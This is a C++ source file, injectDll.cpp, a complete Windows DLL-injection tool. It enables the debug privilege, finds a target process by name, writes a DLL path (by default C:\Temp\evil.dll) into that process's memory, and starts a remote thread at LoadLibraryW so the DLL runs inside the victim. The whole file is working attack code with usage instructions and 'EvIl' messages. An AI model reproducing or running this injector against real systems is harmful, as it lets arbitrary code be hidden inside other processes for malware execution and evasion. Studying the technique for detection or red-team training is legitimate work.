// injectDll.cpp 

#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>

#define EXIT_WITH_ERROR( e ) { fprintf(stderr,"*** %s Error=%d  *** \n", e, GetLastError() ); exit(-1); }

std::wstring stringToWString(const std::string& s)
{
    std::wstring temp(s.length(), L' ');
    std::copy(s.begin(), s.end(), temp.begin());
    return temp;
}

//Function that searches the pid of the process 
DWORD processID(const std::string name) 
{
    std::vector<DWORD> pids;

    fprintf(stderr, " **** Searching PID for the processus : %s ****\n", name);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //snapshot of all processus

    PROCESSENTRY32 currentProcess;
    currentProcess.dwSize = sizeof currentProcess;

    if (!Process32FirstW(snapshot, &currentProcess))
        EXIT_WITH_ERROR("Process32FirstW fail !");

    do {
        if (std::wstring(currentProcess.szExeFile) == stringToWString(name)) {
            pids.emplace_back(currentProcess.th32ProcessID);
            fprintf(stderr, " **** Process find ! pid : %d  , ppid : %d ****\n", currentProcess.th32ProcessID, currentProcess.th32ParentProcessID);
        }
    } while (Process32NextW(snapshot, &currentProcess));

    if (pids.empty()) 
        EXIT_WITH_ERROR("Process not found !");

    return pids[0];

}


int main(int argc, char *argv[])
{
    HANDLE handleProcess;
    HANDLE handleToken;
    LUID luid = { 0 };
    PVOID remoteBuffer;
    wchar_t dllPath[31];
    struct stat buffer;
    char temp[19] = "C:\\Temp\\evil.dll";
    DWORD pid;

    fprintf(stderr, "**** Hello in Classic Dll Injection  ! **** \n");
    
    //USAGE :  injectDll.exe <target.exe>  or injectDll.exe <target.exe> <dllPath>
    
    if (argc == 1 || argc >=4 ) {

        EXIT_WITH_ERROR("You are missing an input | Usage : injectDll.exe <target.exe> or injectDll.exe <target.exe> <dllPath> ");

    }
    else if (argc == 3) {
        fprintf(stderr, "Use  DLLPATH : %s \n",argv[2]);

        if (stat(argv[2], &buffer) != 0) {
            fprintf(stderr, "%s not found ! \n", argv[2]);
            exit(-1);
        }

        mbstowcs_s(NULL, dllPath, strlen(argv[2]) + 1, argv[2], strlen(argv[2]));

    }
    else  {

        fprintf(stderr, "Use default DLLPATH : C:\\Temp\\evil.dll \n");
       
        if (stat(temp, &buffer) != 0) {
            fprintf(stderr, "%s not found ! \n", temp);
            exit(-1);
        }

        mbstowcs_s(NULL, dllPath, strlen(temp) + 1, temp, strlen(temp));
    }

    // Get Token SE_DEBUG_PRIVILEGE
    //Requires administrator rights ! 

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &handleToken)){
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            TOKEN_PRIVILEGES token = { 0 };
            token.PrivilegeCount = 1;
            token.Privileges[0].Luid = luid;
            token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(handleToken, FALSE, &token, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
        else {
            EXIT_WITH_ERROR("Error LookupPrivilege ! ");
            CloseHandle(handleToken);
        }
    }
    else {
        EXIT_WITH_ERROR("Error get SE_DEBUG_PRIVILEGE token ! ");
        CloseHandle(handleToken);
    }

    CloseHandle(handleToken);

    /* STEP 0 : Search pid of target process */

    pid = processID(argv[1]);

    fprintf(stderr, " **** Injecting DLL to first PID : %i  *****\n",pid);

    /* STEP 1 : Get process handle */
    system("pause");

    handleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (!handleProcess)
        EXIT_WITH_ERROR("Error processHandle !");

    /* STEP 2 : Allocation virtual memory in the target */

    remoteBuffer = VirtualAllocEx(handleProcess, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READONLY);
   
    if (!remoteBuffer)
        EXIT_WITH_ERROR("Error remoteBuffer !");

   /* STEP 3 : Write DLL path to allocated memory & Get address of LoadLibrary */
    DWORD oldProtection;

    VirtualProtectEx(handleProcess, remoteBuffer, sizeof dllPath, PAGE_EXECUTE_READWRITE, &oldProtection);


    WriteProcessMemory(handleProcess, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);


    HMODULE hmodule = GetModuleHandle(TEXT("Kernel32"));

    if (!hmodule)
        EXIT_WITH_ERROR("GetModuleHandle error");

    /* STEP 4 : Load the DLL and launch thread for execute the DLL */

    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(hmodule, "LoadLibraryW");

    if (!threatStartRoutineAddress)
        EXIT_WITH_ERROR("Error threatStartRoutineAddress");

    CreateRemoteThread(handleProcess, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);

    VirtualProtectEx(handleProcess, remoteBuffer, sizeof dllPath, PAGE_READONLY, &oldProtection);

    system("pause");

    CloseHandle(handleProcess);

    fprintf(stderr, "***** Succes, GoodBye ! EvIl *****\n");
    return 0;
}

